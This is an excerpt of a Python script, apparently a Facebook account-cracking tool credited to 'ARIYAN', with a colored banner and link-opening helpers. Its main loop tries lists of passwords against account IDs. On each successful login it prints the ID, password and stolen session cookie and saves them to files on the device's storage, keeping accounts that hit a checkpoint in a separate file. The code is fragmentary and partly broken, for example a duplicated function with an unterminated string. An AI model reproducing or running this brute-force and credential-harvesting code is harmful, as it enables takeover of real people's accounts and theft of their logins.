...
{B} [{R}✔{B}] {Y}DEVELOPER  :{G}  ARIYAN

{B} [{R}✔{B}] {B}FACEBOOK   :{G} ARIYAN SHUVO

{B} [{R}✔{B}] {nb}WHATSAPP   :{G} +fuck is bby

{B} [{R}✔{B}] {R}VERSION    :{G} 0.0.7

{Y}*******************************************************"""

def fb():

    s("xdg-open https://www.facebook.com/profile.php?id=100079143742521")

def git():

    s(" os.system('xdg-open https://github.com/AKA-404")

def git():

    s("xdg-open https://github.com/AKA-404")
...
def o():
    ...
    if opt == '1':
        ...
        s("xdg-open https://www.facebook.com/groups/672751520627850/?ref")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"{G} [ AKA-OK🥰 ] {cid} | {ps}")

                print(f"{B} [  COOKIE  ] {coki}")

                cek_apk(session,coki)

                open('/sdcard/Aka-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print(f"{R} [ AKA-CP😭] {cid} | {ps}")

                open('/sdcard/Aka-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[ AKA ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
